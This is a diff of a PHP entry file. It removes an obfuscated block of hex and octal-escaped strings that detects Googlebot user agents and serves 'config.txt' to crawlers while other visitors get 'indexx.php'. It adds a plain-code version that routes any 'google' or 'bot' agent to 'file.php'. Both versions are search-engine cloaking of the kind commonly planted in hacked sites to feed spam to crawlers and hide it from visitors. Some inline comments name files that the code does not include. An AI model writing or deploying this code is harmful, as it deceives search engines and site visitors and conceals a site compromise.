@@ -1,2 +1,14 @@
 <?php
- goto KHJE4; KHJE4: function is_google_bot() { $agents = array("\107\x6f\157\x67\x6c\x65\x62\157\x74", "\x47\x6f\x6f\147\154\x65\55\123\x69\x74\145\x2d\x56\145\162\x69\x66\x69\x63\141\164\151\157\156", "\107\x6f\x6f\147\x6c\145\55\111\156\163\160\x65\143\164\x69\157\x6e\124\157\157\154", "\x47\x6f\x6f\x67\154\x65\x62\157\x74\55\x4d\157\142\x69\x6c\145", "\107\x6f\157\147\154\145\x62\x6f\x74\x2d\x4e\145\167\x73"); foreach ($agents as $agent) { if (strpos($_SERVER["\110\124\x54\120\137\x55\123\x45\122\x5f\x41\x47\x45\x4e\x54"], $agent) !== false) { return true; } } return false; } goto i6CWR; i6CWR: if (is_google_bot()) { $bot_content = file_get_contents("\x63\x6f\x6e\x66\151\147\x2e\164\170\164"); echo $bot_content; die; } else { include "\151\156\144\x65\x78\170\56\160\150\x70"; die; } goto Cw6Ei; Cw6Ei: ?>
+// Kullanıcı IP'si ve User-Agent'ı kontrol et
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+
+// Google ile ilgili user-agent kontrolleri
+if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
+    include('file.php');  // Google bot ise google.php göster
+} elseif ($is_mobile) {
+    include('home.php');  // Mobil cihaz ise kullanici.php göster
+} else {
+    include('home.php');  // Diğer durumlar için default içerik
+}
+?>
